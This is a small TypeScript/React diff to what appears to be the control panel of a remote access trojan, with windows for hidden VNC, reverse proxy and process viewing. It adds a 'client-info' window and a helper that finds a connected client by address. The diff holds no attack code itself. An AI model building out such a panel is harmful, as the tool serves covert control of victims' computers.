@@ -18,6 +18,8 @@ import clientsTest from "../../../python_utils_testing/test_clients.json";
 
 const translateWindowType = (type: string) => {
   switch (type) {
+    case "client-info":
+      return "Client Info";
     case "hvnc":
       return "HVNC";
     case "process-viewer":
@@ -40,6 +42,10 @@ const translateWindowType = (type: string) => {
 };
 
 const windowTypeSizes = {
+  "client-info": {
+    width: 600,
+    height: 800,
+  },
   "reverse-proxy": {
     width: 1000,
     height: 700,
@@ -216,6 +222,13 @@ export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
     }
   };
 
+  async function getClientByAddr(addr: string) {
+    console.log(clientList);
+    let x = clientList.find((client) => client.data.addr === addr);
+    console.log("Client found", x);
+    return x;
+  }
+
   async function waitNotification(type: string) {
     let genericStyle = "!bg-white !text-black !rounded-2xl !border-accentx";
 
@@ -296,6 +309,7 @@ export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
     notificationClient,
     openClientWindow,
     serverLogs,
+    getClientByAddr,
   };
 
   return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
